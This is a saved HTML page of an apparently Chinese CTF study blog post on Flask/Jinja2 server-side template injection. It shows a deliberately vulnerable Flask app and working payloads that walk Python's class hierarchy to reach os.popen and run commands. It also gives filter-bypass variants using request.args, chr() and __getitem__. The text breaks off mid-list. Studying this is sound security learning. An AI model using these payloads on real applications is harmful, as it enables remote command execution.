@@ -1,0 +1,530 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="dark"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width,initial-scale=1"><title>ssti | upload</title><meta name="keywords" content="ssti"><meta name="author" content="upload"><meta name="copyright" content="upload"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#0d0d0d"><meta http-equiv="Cache-Control" content="no-transform"><meta http-equiv="Cache-Control" content="no-siteapp"><meta name="description" content="Welcome to my blog 😁😁😁😁">
+<meta property="og:type" content="article">
+<meta property="og:title" content="ssti">
+<meta property="og:url" content="http://upload.love/2021/03/31/ssti/index.html">
+<meta property="og:site_name" content="upload">
+<meta property="og:description" content="Welcome to my blog 😁😁😁😁">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://raw.githubusercontent.com/kingkaki/cloud-img/master/blog-archive//Flask-Jinja2-SSTI-python-%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8/3.png">
+<meta property="article:published_time" content="2021-03-31T11:41:21.000Z">
+<meta property="article:modified_time" content="2021-08-06T16:09:22.000Z">
+<meta property="article:author" content="upload">
+<meta property="article:tag" content="ssti">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://raw.githubusercontent.com/kingkaki/cloud-img/master/blog-archive//Flask-Jinja2-SSTI-python-%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8/3.png"><link rel="shortcut icon" href="/%E7%94%B7%E5%AD%A9.png"><link rel="canonical" href="http://upload.love/2021/03/31/ssti/"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/node-snackbar/dist/snackbar.min.css"><script>var GLOBAL_CONFIG = { 
+  root: '/',
+  algolia: undefined,
+  localSearch: {"path":"search.xml","languages":{"hits_empty":"找不到您查询的内容：${query}"}},
+  translate: {"defaultEncoding":2,"translateDelay":0,"msgToTraditionalChinese":"繁","msgToSimplifiedChinese":"簡"},
+  noticeOutdate: undefined,
+  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true},
+  copy: {
+    success: '复制成功',
+    error: '复制错误',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '天',
+  date_suffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  ClickShowText: undefined,
+  lightbox: 'mediumZoom',
+  Snackbar: {"chs_to_cht":"你已切换为繁体","cht_to_chs":"你已切换为简体","day_to_night":"你已切换为深色模式","night_to_day":"你已切换为浅色模式","bgLight":"#49b1f5","bgDark":"#121212","position":"bottom-left"},
+  source: {
+    jQuery: 'https://cdn.jsdelivr.net/npm/jquery@latest/dist/jquery.min.js',
+    justifiedGallery: {
+      js: 'https://cdn.jsdelivr.net/npm/justifiedGallery/dist/js/jquery.justifiedGallery.min.js',
+      css: 'https://cdn.jsdelivr.net/npm/justifiedGallery/dist/css/justifiedGallery.min.css'
+    },
+    fancybox: {
+      js: 'https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.js',
+      css: 'https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.css'
+    }
+  },
+  isPhotoFigcaption: false,
+  islazyload: true,
+  isanchor: false
+};
+
+var saveToLocal = {
+  set: function setWithExpiry(key, value, ttl) {
+    const now = new Date()
+    const expiryDay = ttl * 86400000
+    const item = {
+      value: value,
+      expiry: now.getTime() + expiryDay,
+    }
+    localStorage.setItem(key, JSON.stringify(item))
+  },
+
+  get: function getWithExpiry(key) {
+    const itemStr = localStorage.getItem(key)
+
+    if (!itemStr) {
+      return undefined
+    }
+    const item = JSON.parse(itemStr)
+    const now = new Date()
+
+    if (now.getTime() > item.expiry) {
+      localStorage.removeItem(key)
+      return undefined
+    }
+    return item.value
+  }
+}
+
+// https://stackoverflow.com/questions/16839698/jquery-getscript-alternative-in-native-javascript
+const getScript = url => new Promise((resolve, reject) => {
+  const script = document.createElement('script')
+  script.src = url
+  script.async = true
+  script.onerror = reject
+  script.onload = script.onreadystatechange = function() {
+    const loadState = this.readyState
+    if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+    script.onload = script.onreadystatechange = null
+    resolve()
+  }
+  document.head.appendChild(script)
+})</script><script id="config_change">var GLOBAL_CONFIG_SITE = { 
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: true,
+  postUpdate: '2021-08-07 00:09:22'
+}</script><noscript><style type="text/css">
+  #nav {
+    opacity: 1
+  }
+  .justified-gallery img {
+    opacity: 1
+  }
+
+  #recent-posts time,
+  #post-meta time {
+    display: inline !important
+  }
+</style></noscript><script>(function () {  window.activateDarkMode = function () {
+    document.documentElement.setAttribute('data-theme', 'dark')
+    if (document.querySelector('meta[name="theme-color"]') !== null) {
+      document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+    }
+  }
+  window.activateLightMode = function () {
+    document.documentElement.setAttribute('data-theme', 'light')
+   if (document.querySelector('meta[name="theme-color"]') !== null) {
+      document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+    }
+  }
+  const autoChangeMode = 'true'
+  const t = saveToLocal.get('theme')
+  if (autoChangeMode === '1') {
+    const isDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches
+    const isLightMode = window.matchMedia('(prefers-color-scheme: light)').matches
+    const isNotSpecified = window.matchMedia('(prefers-color-scheme: no-preference)').matches
+    const hasNoSupport = !isDarkMode && !isLightMode && !isNotSpecified
+    if (t === undefined) {
+      if (isLightMode) activateLightMode()
+      else if (isDarkMode) activateDarkMode()
+      else if (isNotSpecified || hasNoSupport) {
+        const now = new Date()
+        const hour = now.getHours()
+        const isNight = hour <= 6 || hour >= 18
+        isNight ? activateDarkMode() : activateLightMode()
+      }
+      window.matchMedia('(prefers-color-scheme: dark)').addListener(function (e) {
+        if (saveToLocal.get('theme') === undefined) {
+          e.matches ? activateDarkMode() : activateLightMode()
+        }
+      })
+    } else if (t === 'light') activateLightMode()
+    else activateDarkMode()
+  } else if (autoChangeMode === '2') {
+    const now = new Date()
+    const hour = now.getHours()
+    const isNight = hour <= 6 || hour >= 18
+    if (t === undefined) isNight ? activateDarkMode() : activateLightMode()
+    else if (t === 'light') activateLightMode()
+    else activateDarkMode()
+  } else {
+    if (t === 'dark') activateDarkMode()
+    else if (t === 'light') activateLightMode()
+  }const asideStatus = saveToLocal.get('aside-status')
+if (asideStatus !== undefined) {
+   if (asideStatus === 'hide') {
+     document.documentElement.classList.add('hide-aside')
+   } else {
+     document.documentElement.classList.remove('hide-aside')
+   }
+}})()</script><link rel="stylesheet" href="/css/background.css"><meta name="generator" content="Hexo 5.2.0"><link rel="alternate" href="/atom.xml" title="upload" type="application/atom+xml">
+</head><body><div id="web_bg"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="author-avatar"><img class="avatar-img" data-lazy-src="/image/pp.jpg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data"><div class="data-item is-center"><div class="data-item-link"><a href="/archives/"><div class="headline">文章</div><div class="length-num">196</div></a></div></div><div class="data-item is-center"><div class="data-item-link"><a href="/tags/"><div class="headline">标签</div><div class="length-num">136</div></a></div></div><div class="data-item is-center"><div class="data-item-link"><a href="/categories/"><div class="headline">分类</div><div class="length-num">17</div></a></div></div></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> ♥♥♥</span></a></div><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 主页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 目录</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><i class="fa-fw fas fa-list"></i><span> 娱乐</span><i class="fas fa-chevron-down expand"></i></a><ul class="menus_item_child"><li><a class="site-page" href="/music/"><i class="fa-fw fas fa-music"></i><span> Music</span></a></li><li><a class="site-page" href="/movies/"><i class="fa-fw fas fa-video"></i><span> Movie</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> Link</span></a></div></div></div></div><div id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url(/2.jpg)"><nav id="nav"><span id="blog_name"><a id="site-name" href="/">upload</a></span><div id="menus"><div id="search-button"><a class="site-page social-icon search"><i class="fas fa-search fa-fw"></i><span> 搜索</span></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> ♥♥♥</span></a></div><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 主页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 目录</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><i class="fa-fw fas fa-list"></i><span> 娱乐</span><i class="fas fa-chevron-down expand"></i></a><ul class="menus_item_child"><li><a class="site-page" href="/music/"><i class="fa-fw fas fa-music"></i><span> Music</span></a></li><li><a class="site-page" href="/movies/"><i class="fa-fw fas fa-video"></i><span> Movie</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> Link</span></a></div></div><div id="toggle-menu"><a class="site-page"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">ssti</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2021-03-31T11:41:21.000Z" title="发表于 2021-03-31 19:41:21">2021-03-31</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2021-08-06T16:09:22.000Z" title="更新于 2021-08-07 00:09:22">2021-08-07</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/%E7%9F%A5%E8%AF%86%E7%82%B9%E5%AD%A6%E4%B9%A0/">知识点学习</a></span></div><div class="meta-secondline"> <span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">字数总计:</span><span class="word-count">3.2k</span><span class="post-meta-separator">|</span><i class="far fa-clock fa-fw post-meta-icon"></i><span class="post-meta-label">阅读时长:</span><span>13分钟</span></span><span class="post-meta-separator">|</span><span class="post-meta-pv-cv"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>一直对模板注入似懂非懂的，打算在这篇文章中深入的研究一下模板注入以及在ctf中bypass的办法。</p>
+<h2 id="Learning"><a href="#Learning" class="headerlink" title="Learning"></a>Learning</h2><h3 id="什么是模板-amp-模板注入"><a href="#什么是模板-amp-模板注入" class="headerlink" title="什么是模板&amp;模板注入"></a>什么是模板&amp;模板注入</h3><p>小学的时候拿别人的好词好句，套在我们自己的作文里，此时我们的作文就相当于模板，而别人的好词好句就相当于传递进模板的内容。</p>
+<p>那么什么是模板注入呢，当不正确的使用模板引擎进行渲染时，则会造成模板注入，比如：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">from flask import Flask</span><br><span class="line">from flask import request</span><br><span class="line">from flask import config</span><br><span class="line">from flask import render_template_string</span><br><span class="line">app &#x3D; Flask(__name__)</span><br><span class="line"></span><br><span class="line">app.config[&#39;SECRET_KEY&#39;] &#x3D; &quot;flag&#123;SSTI_123456&#125;&quot;</span><br><span class="line">@app.route(&#39;&#x2F;&#39;)</span><br><span class="line">def hello_world():</span><br><span class="line">    return &#39;Hello World!&#39;</span><br><span class="line"></span><br><span class="line">@app.errorhandler(404)</span><br><span class="line">def page_not_found(e):</span><br><span class="line">    template &#x3D; &#39;&#39;&#39;</span><br><span class="line">&#123;%% block body %%&#125;</span><br><span class="line">    &lt;div class&#x3D;&quot;center-content error&quot;&gt;</span><br><span class="line">        &lt;h1&gt;Oops! That page doesn&#39;t exist.&lt;&#x2F;h1&gt;</span><br><span class="line">        &lt;h3&gt;%s&lt;&#x2F;h3&gt;</span><br><span class="line">    &lt;&#x2F;div&gt; </span><br><span class="line">&#123;%% endblock %%&#125;</span><br><span class="line">&#39;&#39;&#39; % (request.args.get(&#39;404_url&#39;))</span><br><span class="line">    return render_template_string(template), 404</span><br><span class="line"></span><br><span class="line">if __name__ &#x3D;&#x3D; &#39;__main__&#39;:</span><br><span class="line">    app.run(host&#x3D;&#39;0.0.0.0&#39;,debug&#x3D;True)</span><br></pre></td></tr></table></figure>
+
+<p>网上大部分所使用的request.url的方式已经不能导致模板注入了，在最新的flask版本中会自动对request.url进行urlencode，所以我稍微改了一下代码，改成request.args传参就可以了。</p>
+<p>在上述代码中，直接将用户可控参数<code>request.args.get(&#39;404_url&#39;)</code>在模板中直接渲染并传回页面中，这种不正确的渲染方法会产生模板注入(SSTI)。</p>
+<p><a target="_blank" rel="noopener" href="https://xzfile.aliyuncs.com/media/upload/picture/20191202012220-21967af0-145f-1.jpg"><img src= "/img/loading.gif" data-lazy-src="https://gitee.com/taochiyu/blogimage/raw/master/img/20210331194203.jpeg" alt="img"></a></p>
+<p>可以看到，页面直接传回了0而不是0。</p>
+<h3 id="How2use"><a href="#How2use" class="headerlink" title="How2use"></a>How2use</h3><p>在Python的ssti中，大部分是依靠基类-&gt;子类-&gt;危险函数的方式来利用ssti，接下来讲几个知识点。</p>
+<ul>
+<li><code>__class__</code></li>
+</ul>
+<p>万物皆对象，而<strong>class</strong>用于返回该对象所属的类，比如某个字符串，他的对象为字符串对象，而其所属的类为<code>&lt;class &#39;str&#39;&gt;</code>。</p>
+<ul>
+<li><code>__bases__</code></li>
+</ul>
+<p>以元组的形式返回一个类所直接继承的类。</p>
+<ul>
+<li><code>__base__</code></li>
+</ul>
+<p>以字符串返回一个类所直接继承的类。</p>
+<ul>
+<li><code>__mro__</code></li>
+</ul>
+<p>返回解析方法调用的顺序。</p>
+<ul>
+<li><code>__subclasses__()</code></li>
+</ul>
+<p>获取类的所有子类。</p>
+<ul>
+<li><code>__init__</code></li>
+</ul>
+<p>所有自带带类都包含<strong>init</strong>方法，便于利用他当跳板来调用<strong>globals</strong>。</p>
+<ul>
+<li><code>__globals__</code></li>
+</ul>
+<p><code>function.__globals__</code>，用于获取function所处空间下可使用的module、方法以及所有变量。</p>
+<p>在看完上边这些自带方法、成员变量后，可能有点懵，接下来看看是如何利用这些方法以及成员变量达到我们想要的目的的。</p>
+<p>在SSTI中，我们要做的无非就两个：</p>
+<ul>
+<li>执行命令</li>
+<li>获取文件内容</li>
+</ul>
+<p>所以我们所做的一切实际上都是在往这两个结果靠拢。</p>
+<p>测试代码：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># -*- coding:utf8 -*-</span><br><span class="line">from flask import Flask</span><br><span class="line">from flask import request</span><br><span class="line">from flask import config</span><br><span class="line">from flask import render_template_string</span><br><span class="line">app &#x3D; Flask(__name__)</span><br><span class="line"></span><br><span class="line">app.config[&#39;SECRET_KEY&#39;] &#x3D; &quot;flag&#123;SSTI_123456&#125;&quot;</span><br><span class="line">@app.route(&#39;&#x2F;&#39;)</span><br><span class="line">def hello_world():</span><br><span class="line">    return &#39;Hello World!&#39;</span><br><span class="line"></span><br><span class="line">@app.errorhandler(404)</span><br><span class="line">def page_not_found(e):</span><br><span class="line">    template &#x3D; &#39;&#39;&#39;</span><br><span class="line">&#123;%% block body %%&#125;</span><br><span class="line">    &lt;div class&#x3D;&quot;center-content error&quot;&gt;</span><br><span class="line">        &lt;h1&gt;Oops! That page doesn&#39;t exist.&lt;&#x2F;h1&gt;</span><br><span class="line">        &lt;h3&gt;%s&lt;&#x2F;h3&gt;</span><br><span class="line">    &lt;&#x2F;div&gt; </span><br><span class="line">&#123;%% endblock %%&#125;</span><br><span class="line">&#39;&#39;&#39; % (request.args.get(&#39;404_url&#39;))</span><br><span class="line">    return render_template_string(template), 404</span><br><span class="line"></span><br><span class="line">if __name__ &#x3D;&#x3D; &#39;__main__&#39;:</span><br><span class="line">    app.run(host&#x3D;&#39;0.0.0.0&#39;,debug&#x3D;True)</span><br></pre></td></tr></table></figure>
+
+<p>当我们访问的页面404时，会从get传递的参数中获取404_url的值并且拼接进模板进行渲染。</p>
+<p><a target="_blank" rel="noopener" href="https://xzfile.aliyuncs.com/media/upload/picture/20191207110140-e4179194-189d-1.jpg"><img src= "/img/loading.gif" data-lazy-src="https://gitee.com/taochiyu/blogimage/raw/master/img/20210331194203.jpeg" alt="img"></a></p>
+<p>接下来看看常规操作：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&quot;&quot;.__class__</span><br></pre></td></tr></table></figure>
+
+<p><a target="_blank" rel="noopener" href="https://xzfile.aliyuncs.com/media/upload/picture/20191207110140-e44b9d22-189d-1.jpg"><img src= "/img/loading.gif" data-lazy-src="https://gitee.com/taochiyu/blogimage/raw/master/img/20210331194203.jpeg" alt="img"></a></p>
+<p>先使用该payload来获取某个类，这里可以获取到的是str类，实际上获取到任何类都可以，因为我们都最终目的是要获取到基类Object。</p>
+<p>接下来我们可以通过<strong>bases</strong>或者<strong>mro</strong>来获取到object基类。</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&quot;&quot;.__class__.__bases__</span><br></pre></td></tr></table></figure>
+
+<p><a target="_blank" rel="noopener" href="https://xzfile.aliyuncs.com/media/upload/picture/20191207110140-e46211c4-189d-1.jpg"><img src= "/img/loading.gif" data-lazy-src="https://gitee.com/taochiyu/blogimage/raw/master/img/20210331194203.jpeg" alt="img"></a></p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&quot;&quot;.__class__.__mro__[1]</span><br></pre></td></tr></table></figure>
+
+<p><a target="_blank" rel="noopener" href="https://xzfile.aliyuncs.com/media/upload/picture/20191207110141-e47dc2a2-189d-1.jpg"><img src= "/img/loading.gif" data-lazy-src="https://gitee.com/taochiyu/blogimage/raw/master/img/20210331194203.jpeg" alt="img"></a></p>
+<p>接下来获取其所有子类：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&quot;&quot;.__class__.__mro__[1].__subclasses__()</span><br></pre></td></tr></table></figure>
+
+<p><a target="_blank" rel="noopener" href="https://xzfile.aliyuncs.com/media/upload/picture/20191207110142-e54b87f0-189d-1.jpg"><img src= "/img/loading.gif" data-lazy-src="https://gitee.com/taochiyu/blogimage/raw/master/img/20210331194203.jpeg" alt="img"></a></p>
+<p>我们只需要寻找可能执行命令或者可以读取文件的类就可以了，重点关注os/file这些关键字。</p>
+<p>获取到subclasses后，初步看了一下没有能直接执行命令或者获取文件内容的，接下来使用<strong>init</strong>.<strong>globals</strong>来看看有没有os module或者其他的可以读写文件的。</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;&#123;&quot;&quot;.__class__.__mro__[1].__subclasses__()[303].__init__.__globals__&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>这里我用burp来爆破303这个数字，从0爆破到一千，可以发现有很多个内置类都可以使用os这个模块，于是就可以欢乐的执行系统命令了～</p>
+<p><a target="_blank" rel="noopener" href="https://xzfile.aliyuncs.com/media/upload/picture/20191207110143-e5bab5d0-189d-1.jpg"><img src= "/img/loading.gif" data-lazy-src="https://xzfile.aliyuncs.com/media/upload/picture/20191207110143-e5bab5d0-189d-1.jpg" alt="img"></a></p>
+<p>最终payload：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;&#123;&quot;&quot;.__class__.__mro__[1].__subclasses__()[300].__init__.__globals__[&quot;os&quot;][&quot;popen&quot;](&quot;whoami&quot;).read()&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<p><a target="_blank" rel="noopener" href="https://xzfile.aliyuncs.com/media/upload/picture/20191207110143-e60252f0-189d-1.jpg"><img src= "/img/loading.gif" data-lazy-src="https://xzfile.aliyuncs.com/media/upload/picture/20191207110143-e60252f0-189d-1.jpg" alt="img"></a></p>
+<h3 id="Bypass-in-CTF"><a href="#Bypass-in-CTF" class="headerlink" title="Bypass in CTF"></a>Bypass in CTF</h3><p>当我们需要测试SSTI过滤了什么的时候，可以使用如下payload防止其500:</p>
+<p><code>&#123;&#123;"要测试的字符"&#125;&#125;</code>，只需要看看要测试的字符是否返回在页面中即可，下面分别说说对应各种过滤情况的解决办法。</p>
+<p>我们首先要知道，过滤了某种字符对我们的影响，接下来再对应寻找payload来利用。</p>
+<h4 id="过滤引号"><a href="#过滤引号" class="headerlink" title="过滤引号"></a>过滤引号</h4><p>回顾我们上面的payload，哪里使用了引号？</p>
+<p><a target="_blank" rel="noopener" href="https://xzfile.aliyuncs.com/media/upload/picture/20191207110222-fd656e82-189d-1.jpg"><img src= "/img/loading.gif" data-lazy-src="https://gitee.com/taochiyu/blogimage/raw/master/img/20210406190640.jpeg" alt="img"></a></p>
+<p>接下来思考对应的解决办法，首先第一个引号的作用是什么，是为了引出基类，而任何数据结构都可以引出基类，所以这里可以直接使用数组代替，所以上述payload就变成了：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;&#123;[].__class__.__mro__[1].__subclasses__()[300].__init__.__globals__[&quot;os&quot;][&quot;popen&quot;](&quot;whoami&quot;).read()&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>在fuzz的时候我发现，数据结构可以被替换为数组、字典，以及<code>数字0</code>。</p>
+<p>再看看后面的引号是用来干嘛的，首先看看.<strong>init</strong>.<strong>globals</strong>返回的是什么类型的数据:</p>
+<p><a target="_blank" rel="noopener" href="https://xzfile.aliyuncs.com/media/upload/picture/20191207110223-fd8486c8-189d-1.jpg"><img src= "/img/loading.gif" data-lazy-src="https://gitee.com/taochiyu/blogimage/raw/master/img/20210406190646.jpeg" alt="img"></a></p>
+<p>所以第一个引号就是获取字典内对应索引的value，这里我们可以使用request.args来绕过此处引号的过滤。</p>
+<p>request.args是flask中一个存储着请求参数以及其值的字典，我们可以像这样来引用他：</p>
+<p><a target="_blank" rel="noopener" href="https://xzfile.aliyuncs.com/media/upload/picture/20191207110223-fdd1a6e2-189d-1.jpg"><img src= "/img/loading.gif" data-lazy-src="https://gitee.com/taochiyu/blogimage/raw/master/img/20210406190650.jpeg" alt="img"></a></p>
+<p>所以第二个引号的绕过方法即：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;&#123;[].__class__.__mro__[1].__subclasses__()[300].__init__.__globals__[request.args.arg1]&#125;&#125;&amp;arg1&#x3D;os</span><br></pre></td></tr></table></figure>
+
+<p>后面的所有引号都可以使用该方法进行绕过。</p>
+<p>还有另外一种绕过引号的办法，即通过python自带函数来绕过引号，这里使用的是chr()。</p>
+<p>首先fuzz一下chr()函数在哪：</p>
+<p>payload：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;&#123;().__class__.__bases__[0].__subclasses__()[§0§].__init__.__globals__.__builtins__.chr&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<p><a target="_blank" rel="noopener" href="https://xzfile.aliyuncs.com/media/upload/picture/20191207110224-fe3c4df8-189d-1.jpg"><img src= "/img/loading.gif" data-lazy-src="https://gitee.com/taochiyu/blogimage/raw/master/img/20210406190711.jpeg" alt="img"></a></p>
+<p>通过payload爆破subclasses，获取某个subclasses中含有chr的类索引，可以看到爆破出来很多了，这里我随便选一个。</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;%set+chr&#x3D;[].__class__.__bases__[0].__subclasses__()[77].__init__.__globals__.__builtins__.chr%&#125;</span><br></pre></td></tr></table></figure>
+
+<p>接着尝试使用chr尝试绕过后续所有的引号：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;%set+chr&#x3D;[].__class__.__bases__[0].__subclasses__()[77].__init__.__globals__.__builtins__.chr%&#125;&#123;&#123;[].__class__.__mro__[1].__subclasses__()[300].__init__.__globals__[chr(111)%2bchr(115)][chr(112)%2bchr(111)%2bchr(112)%2bchr(101)%2bchr(110)](chr(108)%2bchr(115)).read()&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<p><a target="_blank" rel="noopener" href="https://xzfile.aliyuncs.com/media/upload/picture/20191207110224-fea00528-189d-1.jpg"><img src= "/img/loading.gif" data-lazy-src="https://gitee.com/taochiyu/blogimage/raw/master/img/20210406190711.jpeg" alt="img"></a></p>
+<h4 id="过滤中括号"><a href="#过滤中括号" class="headerlink" title="过滤中括号"></a>过滤中括号</h4><p>回看最初的payload，过滤中括号对我们影响最大的是什么，前边两个中括号都是为了从数组中取值，而后续的中括号实际是不必要的，<strong>globals</strong>[“os”]可以替换为<strong>globals</strong>.os。</p>
+<p>所以过滤了中括号实际上影响我们的只有从数组中取值，然而从数组中取值，而从数组中取值可以使用pop/<strong>getitem</strong>等数组自带方法。</p>
+<p>不过还是建议用<strong>getitem</strong>，因为pop会破坏数组的结构。</p>
+<p>a[0]与a.<strong>getitem</strong>(0)的效果是一样的，所以上述payload可以用此来绕过：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;&#123;&quot;&quot;.__class__.__mro__.__getitem__(1).__subclasses__()[300].__init__.__globals__[&quot;os&quot;][&quot;popen&quot;](&quot;whoami&quot;).read()&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<p><img src= "/img/loading.gif" data-lazy-src="https://gitee.com/taochiyu/blogimage/raw/master/img/20210406190711.jpeg" alt="img"></p>
+<h4 id="过滤小括号"><a href="#过滤小括号" class="headerlink" title="过滤小括号"></a>过滤小括号</h4><p>需要注意的一点是，如果题目过滤了小括号，那么我们就无法执行任何函数了，只能获取一些敏感信息比如题目中的config。</p>
+<p>因为如果要执行函数就必须使用小括号来传参，目前我还没找到能够代替小括号进行传参的办法。</p>
+<h4 id="过滤关键字"><a href="#过滤关键字" class="headerlink" title="过滤关键字"></a>过滤关键字</h4><p><code>主要看关键字是如何过滤的，如果只是替换为空，可以尝试双写绕过，如果直接ban了，就可以使用字符串合并的方式进行绕过。</code></p>
+<p><code>使用中括号的payload：</code></p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;&#123;&quot;&quot;[&quot;__cla&quot;+&quot;ss__&quot;]&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>不使用中括号的payload：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;&#123;&quot;&quot;.__getattribute__(&quot;__cla&quot;+&quot;ss__&quot;)&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<p><code>这里主要使用了**getattribute**来获取字典中的value，参数为key值。</code></p>
+<p><code>第二种绕过过滤关键字的办法之前也提到了，即使用request对象：</code></p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;&quot;&quot;.__getattribute__(request.args.a)&#125;&#125;&amp;a&#x3D;__class__</span><br></pre></td></tr></table></figure>
+
+<p>第三种绕过关键字过滤的办法即使用str原生函数：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[&#39;__add__&#39;, &#39;__class__&#39;, &#39;__contains__&#39;, &#39;__delattr__&#39;, &#39;__doc__&#39;, &#39;__eq__&#39;, &#39;__format__&#39;, &#39;__ge__&#39;, &#39;__getattribute__&#39;, &#39;__getitem__&#39;, &#39;__getnewargs__&#39;, &#39;__getslice__&#39;, &#39;__gt__&#39;, &#39;__hash__&#39;, &#39;__init__&#39;, &#39;__le__&#39;, &#39;__len__&#39;, &#39;__lt__&#39;, &#39;__mod__&#39;, &#39;__mul__&#39;, &#39;__ne__&#39;, &#39;__new__&#39;, &#39;__reduce__&#39;, &#39;__reduce_ex__&#39;, &#39;__repr__&#39;, &#39;__rmod__&#39;, &#39;__rmul__&#39;, &#39;__setattr__&#39;, &#39;__sizeof__&#39;, &#39;__str__&#39;, &#39;__subclasshook__&#39;, &#39;_formatter_field_name_split&#39;, &#39;_formatter_parser&#39;, &#39;capitalize&#39;, &#39;center&#39;, &#39;count&#39;, &#39;decode&#39;, &#39;encode&#39;, &#39;endswith&#39;, &#39;expandtabs&#39;, &#39;find&#39;, &#39;format&#39;, &#39;index&#39;, &#39;isalnum&#39;, &#39;isalpha&#39;, &#39;isdigit&#39;, &#39;islower&#39;, &#39;isspace&#39;, &#39;istitle&#39;, &#39;isupper&#39;, &#39;join&#39;, &#39;ljust&#39;, &#39;lower&#39;, &#39;lstrip&#39;, &#39;partition&#39;, &#39;replace&#39;, &#39;rfind&#39;, &#39;rindex&#39;, &#39;rjust&#39;, &#39;rpartition&#39;, 